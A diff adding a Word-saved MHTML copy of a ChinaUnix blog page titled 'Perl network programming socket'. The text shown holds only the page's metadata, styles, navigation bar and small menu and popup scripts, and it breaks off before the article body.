@@ -1,0 +1,2715 @@
+MIME-Version: 1.0
+Content-Location: file:///C:/2D233914/file3092.htm
+Content-Transfer-Encoding: quoted-printable
+Content-Type: text/html; charset="us-ascii"
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<!-- saved from url=3D(0054)http://blog.chinaunix.net/u1/59865/showart_4990=
+89.html -->
+<html xmlns:v=3D"urn:schemas-microsoft-com:vml"
+xmlns:o=3D"urn:schemas-microsoft-com:office:office"
+xmlns:w=3D"urn:schemas-microsoft-com:office:word"
+xmlns=3D"http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=3DContent-Type content=3D"text/html; charset=3Dus-ascii">
+<meta name=3DProgId content=3DWord.Document>
+<meta name=3DGenerator content=3D"Microsoft Word 10">
+<meta name=3DOriginator content=3D"Microsoft Word 10">
+<link rel=3DFile-List href=3D"file3092_files/filelist.xml">
+<link rel=3DEdit-Time-Data href=3D"file3092_files/editdata.mso">
+<!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+w\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]-->
+<title>Perl&#32593;&#32476;&#32534;&#31243; socket - perl - mouse0301</titl=
+e>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>XIE Jiping</o:Author>
+  <o:LastAuthor>XIE Jiping</o:LastAuthor>
+  <o:Revision>2</o:Revision>
+  <o:TotalTime>1</o:TotalTime>
+  <o:Created>2008-10-08T09:39:00Z</o:Created>
+  <o:LastSaved>2008-10-08T09:39:00Z</o:LastSaved>
+  <o:Pages>3</o:Pages>
+  <o:Words>1433</o:Words>
+  <o:Characters>8172</o:Characters>
+  <o:Company>ASB</o:Company>
+  <o:Lines>68</o:Lines>
+  <o:Paragraphs>19</o:Paragraphs>
+  <o:CharactersWithSpaces>9586</o:CharactersWithSpaces>
+  <o:Version>10.6845</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:Compatibility>
+   <w:UseFELayout/>
+  </w:Compatibility>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel>
+ </w:WordDocument>
+</xml><![endif]-->
+<link rel=3DStylesheet type=3D"text/css" media=3Dall
+href=3D"file:///D:\Projects\TestTools\Tools\Perl\Doc\Perl&#32593;&#32476;&#=
+32534;&#31243;%20socket%20-%20perl%20-%20mouse0301.files\index.css">
+<style>
+<!--
+ /* Font Definitions */
+ @font-face
+	{font-family:Wingdings;
+	panose-1:5 0 0 0 0 0 0 0 0 0;
+	mso-font-charset:2;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:0 268435456 0 0 -2147483648 0;}
+@font-face
+	{font-family:SimSun;
+	panose-1:2 1 6 0 3 1 1 1 1 1;
+	mso-font-alt:SimSun;
+	mso-font-charset:134;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:3 135135232 16 0 262145 0;}
+@font-face
+	{font-family:Verdana;
+	panose-1:2 11 6 4 3 5 4 4 2 4;
+	mso-font-charset:0;
+	mso-generic-font-family:swiss;
+	mso-font-pitch:variable;
+	mso-font-signature:536871559 0 0 0 415 0;}
+@font-face
+	{font-family:SimSun;
+	panose-1:2 1 6 0 3 1 1 1 1 1;
+	mso-font-charset:134;
+	mso-generic-font-family:auto;
+	mso-font-pitch:variable;
+	mso-font-signature:3 135135232 16 0 262145 0;}
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+	{mso-style-parent:"";
+	margin:0cm;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:12.0pt;
+	font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p
+	{mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+pre
+	{margin-top:0cm;
+	margin-bottom:0cm;
+	margin-bottom:.0001pt;
+	font-size:12.0pt;
+	font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.p1, li.p1, div.p1
+	{mso-style-name:p1;
+	margin-top:5.25pt;
+	margin-right:7.5pt;
+	margin-bottom:5.25pt;
+	margin-left:7.5pt;
+	text-indent:19.5pt;
+	line-height:150%;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.p2, li.p2, div.p2
+	{mso-style-name:p2;
+	margin-top:5.25pt;
+	margin-right:19.5pt;
+	margin-bottom:5.25pt;
+	margin-left:19.5pt;
+	text-align:right;
+	text-indent:19.5pt;
+	line-height:150%;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.p3, li.p3, div.p3
+	{mso-style-name:p3;
+	margin-top:.75pt;
+	margin-right:7.5pt;
+	margin-bottom:.75pt;
+	margin-left:7.5pt;
+	line-height:150%;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.tableheader, li.tableheader, div.tableheader
+	{mso-style-name:tableheader;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	border:none;
+	mso-border-left-alt:solid #80C5E9 .75pt;
+	mso-border-right-alt:solid #80C5E9 .75pt;
+	padding:0cm;
+	mso-padding-alt:0cm 0cm 0cm 0cm;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.tableborder, li.tableborder, div.tableborder
+	{mso-style-name:tableborder;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	border:none;
+	mso-border-alt:solid #80C5E9 .75pt;
+	padding:0cm;
+	mso-padding-alt:0cm 0cm 0cm 0cm;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.tablebody, li.tablebody, div.tablebody
+	{mso-style-name:tablebody;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#F0F0F0;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.tablebody2, li.tablebody2, div.tablebody2
+	{mso-style-name:tablebody2;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#F9F9F9;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.windows, li.windows, div.windows
+	{mso-style-name:windows;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#199CE1;
+	border:none;
+	mso-border-top-alt:#D4ECF9;
+	mso-border-left-alt:#D4ECF9;
+	mso-border-bottom-alt:#00679D;
+	mso-border-right-alt:#00679D;
+	mso-border-style-alt:solid;
+	mso-border-width-alt:3.0pt;
+	padding:0cm;
+	mso-padding-alt:0cm 0cm 0cm 0cm;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.text1, li.text1, div.text1
+	{mso-style-name:text1;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	border:none;
+	mso-border-alt:solid #80C5E9 .75pt;
+	padding:0cm;
+	mso-padding-alt:1.0pt 1.0pt 1.0pt 1.0pt;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.text2, li.text2, div.text2
+	{mso-style-name:text2;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	border:none;
+	mso-border-alt:solid #666666 .75pt;
+	padding:0cm;
+	mso-padding-alt:1.0pt 1.0pt 1.0pt 1.0pt;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.button1, li.button1, div.button1
+	{mso-style-name:button1;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#C5E8FA;
+	border:none;
+	mso-border-alt:solid #80C5E9 .75pt;
+	padding:0cm;
+	mso-padding-alt:1.0pt 1.0pt 1.0pt 1.0pt;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.button2, li.button2, div.button2
+	{mso-style-name:button2;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#F8DFB9;
+	border:none;
+	mso-border-alt:solid #F9A859 .75pt;
+	padding:0cm;
+	mso-padding-alt:1.0pt 1.0pt 1.0pt 1.0pt;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.todyacolor, li.todyacolor, div.todyacolor
+	{mso-style-name:todyacolor;
+	mso-margin-top-alt:auto;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	mso-pagination:widow-orphan;
+	background:#99FF00;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.ul0, li.ul0, div.ul0
+	{mso-style-name:ul0;
+	margin-top:2.25pt;
+	margin-right:0cm;
+	mso-margin-bottom-alt:auto;
+	margin-left:0cm;
+	text-align:center;
+	line-height:16.5pt;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.ul1, li.ul1, div.ul1
+	{mso-style-name:ul1;
+	margin:0cm;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+p.ul2, li.ul2, div.ul2
+	{mso-style-name:ul2;
+	margin:0cm;
+	margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:9.0pt;
+	mso-fareast-font-family:SimSun;
+	mso-bidi-font-family:SimSun;}
+span.Hyperlink1
+	{mso-style-name:Hyperlink1;
+	mso-ansi-font-size:9.0pt;
+	mso-bidi-font-size:9.0pt;
+	font-family:Verdana;
+	mso-ascii-font-family:Verdana;
+	mso-hansi-font-family:Verdana;
+	color:#003399;
+	mso-text-animation:none;
+	mso-hide:none;
+	border:solid #003399 1.0pt;
+	mso-border-alt:solid #003399 .25pt;
+	padding:0cm;
+	text-decoration:none;
+	text-underline:none;
+	text-decoration:none;
+	text-line-through:none;}
+@page Section1
+	{size:595.3pt 841.9pt;
+	margin:72.0pt 90.0pt 72.0pt 90.0pt;
+	mso-header-margin:42.55pt;
+	mso-footer-margin:49.6pt;
+	mso-paper-source:0;}
+div.Section1
+	{page:Section1;}
+ /* List Definitions */
+ @list l0
+	{mso-list-id:47802163;
+	mso-list-template-ids:-1447770182;}
+@list l0:level1
+	{mso-level-number-format:bullet;
+	mso-level-text:\F0B7;
+	mso-level-tab-stop:36.0pt;
+	mso-level-number-position:left;
+	text-indent:-18.0pt;
+	mso-ansi-font-size:10.0pt;
+	font-family:Symbol;}
+@list l0:level2
+	{mso-level-number-format:bullet;
+	mso-level-text:o;
+	mso-level-tab-stop:72.0pt;
+	mso-level-number-position:left;
+	text-indent:-18.0pt;
+	mso-ansi-font-size:10.0pt;
+	font-family:"Courier New";
+	mso-bidi-font-family:"Times New Roman";}
+ol
+	{margin-bottom:0cm;}
+ul
+	{margin-bottom:0cm;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+	{mso-style-name:"Table Normal";
+	mso-tstyle-rowband-size:0;
+	mso-tstyle-colband-size:0;
+	mso-style-noshow:yes;
+	mso-style-parent:"";
+	mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
+	mso-para-margin:0cm;
+	mso-para-margin-bottom:.0001pt;
+	mso-pagination:widow-orphan;
+	font-size:10.0pt;
+	font-family:"Times New Roman";
+	mso-fareast-font-family:"Times New Roman";}
+</style>
+<![endif]--></LINK>
+<link title=3D"ChinaUnix Blog RSS Feed"
+href=3D"http://blog.chinaunix.net/u/rss.php?id=3D59865" type=3D"application=
+/rss+xml"
+rel=3Dalternate>
+</LINK>
+<meta content=3D"Perl&#32593;&#32476;&#32534;&#31243; socket - perl - mouse=
+0301"
+name=3Dkeywords>
+<meta content=3D"&#20013;&#22269;&#26368;&#22823;&#30340;IT&#25216;&#26415;=
+&#21338;&#23458;-ChinaUnix&#21338;&#23458;&#65306;Perl&#32593;&#32476;&#325=
+34;&#31243; socket - perl - mouse0301"
+name=3Ddescription>
+<!--[if gte mso 9]><xml>
+ <o:shapedefaults v:ext=3D"edit" spidmax=3D"1026"/>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <o:shapelayout v:ext=3D"edit">
+  <o:idmap v:ext=3D"edit" data=3D"1"/>
+ </o:shapelayout></xml><![endif]-->
+</head>
+
+<body bgcolor=3D"#CCCCCC" lang=3DZH-CN link=3D"#0044B6" vlink=3D"#0044B6"
+style=3D'tab-interval:21.0pt' leftmargin=3D0 topmargin=3D0 align=3Dcenter
+marginheight=3D0 marginwidth=3D0>
+
+<div class=3DSection1>
+
+<div align=3Dcenter>
+
+<table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 wi=
+dth=3D950
+ style=3D'width:712.5pt;border-collapse:collapse;mso-padding-alt:0cm 0cm 0c=
+m 0cm'
+ height=3D25 background=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20=
+-%20perl%20-%20mouse0301.files/bg_menu_top.gif">
+ <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+  <td width=3D540 nowrap style=3D'width:405.0pt;padding:0cm 0cm 0cm 0cm'
+  id=3Dtool-bar>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'>&nbsp;
+  <a href=3D"http://blog.chinaunix.net/" target=3D"_blank"><span style=3D'f=
+ont-family:
+  SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#213=
+38;&#23458;&#39318;&#39029;</span></a>
+  <a href=3D"http://blog.chinaunix.net/register.php" target=3D"_blank"><span
+  style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-=
+family:
+  Verdana'>&#27880;&#20876;</span></a> <a
+  href=3D"http://bbs.chinaunix.net/forumdisplay.php?fid=3D51" target=3D"_bl=
+ank"><span
+  style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-=
+family:
+  Verdana'>&#24314;&#35758;&#19982;&#20132;&#27969;</span></a> <a
+  href=3D"http://blog.chinaunix.net/top/" target=3D"_blank"><span style=3D'=
+font-family:
+  SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#254=
+90;&#34892;&#27036;</span></a>
+  <a href=3D"http://blog.chinaunix.net/u1/59865/" target=3D"_blank"
+  onclick=3D"NewWindows('http://www.cublog.cn/addlink.php?url=3D'+location.=
+href+'&amp;title=3D'+document.title);return false;"><span
+  style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-=
+family:
+  Verdana'>&#21152;&#20837;&#21451;&#24773;&#38142;&#25509;</span></a> <o:p=
+></o:p></span></p>
+  <form action=3D"/search.php" method=3Dget
+  enctype=3D"application/x-www-form-urlencoded">
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </form>
+  </td>
+  <td nowrap style=3D'padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><img
+  border=3D0 width=3D55 height=3D12 id=3Dstarimg
+  src=3D"file:///D:\Projects\TestTools\Tools\Perl\Doc\Perl&#32593;&#32476;&=
+#32534;&#31243;%20socket%20-%20perl%20-%20mouse0301.files\userstar.gif"><a
+  href=3D"http://blog.chinaunix.net/u2/star.php?blogid=3D59865" title=3D&#3=
+2473;&#27492;&#21338;&#23458;&#25512;&#33616;&#20540;
+  id=3Dstar onclick=3D"NewWindows(this.href);return false;"><span style=3D'=
+font-family:
+  SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#255=
+12;&#33616;</span></a>
+  <a href=3D"http://blog.chinaunix.net/u2/complaint.php?blogid=3D59865"
+  title=3D&#25237;&#35785;&#27492;&#21338;&#23458; id=3Dcomplaint
+  onclick=3D"NewWindows(this.href);return false;"><span style=3D'font-famil=
+y:SimSun;
+  mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#25237;&#35=
+785;</span></a>
+  </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-h=
+ansi-font-family:
+  Verdana'>&#25628;&#32034;&#65306;</span><span lang=3DEN-US style=3D'font-=
+size:
+  9.0pt;font-family:Verdana'> <INPUT TYPE=3D"submit" ACTION=3D"/search.php"=
+ VALUE=3D"&#25628;&#32034;" METHOD=3D"get"><a
+  href=3D"http://blog.chinaunix.net/help/"><span style=3D'font-family:SimSu=
+n;
+  mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#24110;&#21=
+161;</span></a><o:p></o:p></span></p>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lang=
+=3DEN-US><script language=3D"JavaScript">
+<!--
+
+navHover =3D function() {
+var lis =3D document.getElementById("navmenu").getElementsByTagName("LI");
+for (var i=3D0; i<lis.length; i++) {
+lis[i].onmouseover=3Dfunction() {
+this.className+=3D" iehover";
+}
+lis[i].onmouseout=3Dfunction() {
+this.className=3Dthis.className.replace(new RegExp(" iehover\\b"), "");
+}
+}
+}
+
+function NewWindows(shref){
+var xx=3D(window.screen.width-450)/2;
+var yy=3D(window.screen.height-200)/2;
+pp=3Dwindow.open(shref,"win","menubar=3Dno,location=3Dno,resizable=3Dno,scr=
+ollbars=3Dno,status=3Dno,left=3D"+xx+",top=3D"+yy+",Width=3D450,Height=3D20=
+0");
+}
+function $(s){return document.getElementById(s);}
+//-->
+</script><span style=3D'display:none;mso-hide:all'><o:p>&nbsp;</o:p></span>=
+</span></p>
+
+<div align=3Dcenter>
+
+<table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 wi=
+dth=3D950
+ style=3D'width:712.5pt;background:#D1ECF9;border-collapse:collapse;mso-pad=
+ding-alt:
+ 0cm 0cm 0cm 0cm' height=3D143>
+ <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+  <td width=3D300 style=3D'width:225.0pt;padding:0cm 0cm 0cm 0cm'>
+  <p align=3Dcenter style=3D'margin:3.75pt;text-align:center;line-height:15=
+0%'><b><span
+  lang=3DEN-US style=3D'font-size:10.5pt;line-height:150%;color:#003399'>mo=
+use0301 </span></b></p>
+  </td>
+  <td width=3D650 style=3D'width:487.5pt;padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span style=3D'font-size:9.0pt;mso-ascii-font-family=
+:Verdana;
+  mso-hansi-font-family:Verdana'>&#23398;&#20064;&#31243;&#24207;&#22312;&#=
+20110;&#23398;&#20064;&#24605;&#24819;</span><span
+  lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p></s=
+pan></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lang=
+=3DEN-US
+style=3D'display:none;mso-hide:all'><o:p>&nbsp;</o:p></span></p>
+
+<div align=3Dcenter>
+
+<table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 wi=
+dth=3D950
+ style=3D'width:712.5pt;background:white;border-collapse:collapse;mso-paddi=
+ng-alt:
+ 0cm 0cm 0cm 0cm' height=3D27
+ background=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20-%20perl%20-=
+%20mouse0301.files/bg_menu.gif">
+ <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+  <td style=3D'padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+  <td width=3D250 style=3D'width:187.5pt;padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'>&nbsp;&nbsp;
+  <a href=3D"http://mouse0301.cublog.cn/" target=3D"_blank"><span style=3D'=
+color:
+  #003399'>mouse0301.cublog.cn</span></a> <o:p></o:p></span></p>
+  </td>
+  <td width=3D700 style=3D'width:525.0pt;padding:0cm 0cm 0cm 0cm'>
+  <ul style=3D'margin-top:0cm' type=3Ddisc id=3Dnavmenu>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://control.cublog.cn/" target=3D"_blank"><span class=3DH=
+yperlink1><span
+       style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+       Verdana;border:none'><span style=3D'border:none'>&#31649;&#29702;&#2=
+1338;&#23458;</span></span></span></a>
+       <o:p></o:p></span></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://control.cublog.cn/article_new.php" target=3D"_blank">=
+<span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#21457;&#34920;&#25991;&#31456;</span></span>=
+</span></a>
+       <o:p></o:p></span></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/guestbook.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#30041;&#35328;</span></span></span></a> <o:p=
+></o:p></span></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/links.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#25910;&#34255;&#22841;</span></span></span><=
+/a> <o:p></o:p></span><!-- 0 --></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/group.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#21338;&#23458;&#22280;</span></span></span><=
+/a> <o:p></o:p></span></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/music.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#38899;&#20048;</span></span></span></a> <o:p=
+></o:p></span><!-- 0 --></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/photo.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#30456;&#20876;</span></span></span></a> <o:p=
+></o:p></span><!-- 0 --></li>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/article.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#25991;&#31456;</span></span></span></a> <o:p=
+></o:p></span></li>
+  </ul>
+  <p class=3DMsoNormal style=3D'mso-margin-top-alt:auto;mso-margin-bottom-a=
+lt:auto;
+  margin-left:36.0pt;text-indent:-18.0pt;line-height:16.5pt;mso-list:l0 lev=
+el2 lfo1;
+  tab-stops:list 72.0pt'><![if !supportLists]><span lang=3DEN-US
+  style=3D'font-size:10.0pt;mso-bidi-font-size:9.0pt;font-family:"Courier N=
+ew";
+  mso-fareast-font-family:"Courier New";color:#2A5200'><span style=3D'mso-l=
+ist:
+  Ignore'>o<span style=3D'font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;
+  </span></span></span><![endif]><span lang=3DEN-US style=3D'font-size:9.0p=
+t;
+  font-family:Verdana;color:#2A5200'><a
+  href=3D"http://blog.chinaunix.net/u1/59865/article_78528.html"><span
+  class=3DHyperlink1><span style=3D'border:none'><span style=3D'border:none=
+'>&middot;
+  per</span></span></span><span class=3DHyperlink1><span style=3D'border:no=
+ne'><span
+  style=3D'border:none'>l</span></span></span><!-- a78528 --></a><!-- 78528=
+ --> <o:p></o:p></span></p>
+  <p class=3DMsoNormal style=3D'mso-margin-top-alt:auto;mso-margin-bottom-a=
+lt:auto;
+  margin-left:36.0pt;text-indent:-18.0pt;line-height:16.5pt;mso-list:l0 lev=
+el2 lfo1;
+  tab-stops:list 72.0pt'><![if !supportLists]><span lang=3DEN-US
+  style=3D'font-size:10.0pt;mso-bidi-font-size:9.0pt;font-family:"Courier N=
+ew";
+  mso-fareast-font-family:"Courier New";color:#2A5200'><span style=3D'mso-l=
+ist:
+  Ignore'>o<span style=3D'font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;
+  </span></span></span><![endif]><span lang=3DEN-US style=3D'font-size:9.0p=
+t;
+  font-family:Verdana;color:#2A5200'><a
+  href=3D"http://blog.chinaunix.net/u1/59865/article_78534.html"><span
+  class=3DHyperlink1><span style=3D'border:none'><span style=3D'border:none=
+'>&middot;
+  shel</span></span></span><span class=3DHyperlink1><span style=3D'border:n=
+one'><span
+  style=3D'border:none'>l</span></span></span><!-- a78534 --></a><!-- 78534=
+ --> <o:p></o:p></span></p>
+  <p class=3DMsoNormal style=3D'mso-margin-top-alt:auto;mso-margin-bottom-a=
+lt:auto;
